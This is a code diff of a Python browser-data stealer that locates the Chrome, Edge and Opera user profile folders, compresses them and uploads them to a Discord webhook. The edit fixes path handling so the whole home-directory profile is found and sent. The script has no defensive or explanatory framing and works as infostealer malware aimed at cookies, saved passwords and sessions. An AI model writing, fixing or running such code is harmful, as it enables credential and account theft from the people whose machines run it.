@@ -3,11 +3,11 @@ import shutil
 import requests
 import tempfile
 
-# Define paths to browser directories (we will fill in the user dynamically)
+# Define paths to browser directories relative to the user's home directory
 browser_paths = {
-    "Chrome": r"\AppData\Local\Google\Chrome\User Data",
-    "Edge": r"\AppData\Local\Microsoft\Edge\User Data",
-    "Opera": r"\AppData\Roaming\Opera Software\Opera Stable"
+    "Chrome": os.path.join(os.path.expanduser("~"), r"AppData\Local\Google\Chrome\User Data"),
+    "Edge": os.path.join(os.path.expanduser("~"), r"AppData\Local\Microsoft\Edge\User Data"),
+    "Opera": os.path.join(os.path.expanduser("~"), r"AppData\Roaming\Opera Software\Opera Stable")
 }
 
 # Discord Webhook URL (your provided webhook)
@@ -55,13 +55,8 @@ def send_file_to_discord(zip_file, browser_name):
 
 # Function to find and send all browser data
 def find_and_send_browser_data():
-    # Get the user's home directory (C:\Users\<Username>\)
-    home_dir = os.path.expanduser("~")
-
     # Loop through the browser paths, copy and compress their profiles, and send to Discord
-    for browser_name, relative_path in browser_paths.items():
-        full_path = os.path.join(home_dir, relative_path)
-
+    for browser_name, full_path in browser_paths.items():
         # Check if the browser profile directory exists
         if os.path.exists(full_path):
             # Copy and compress the data
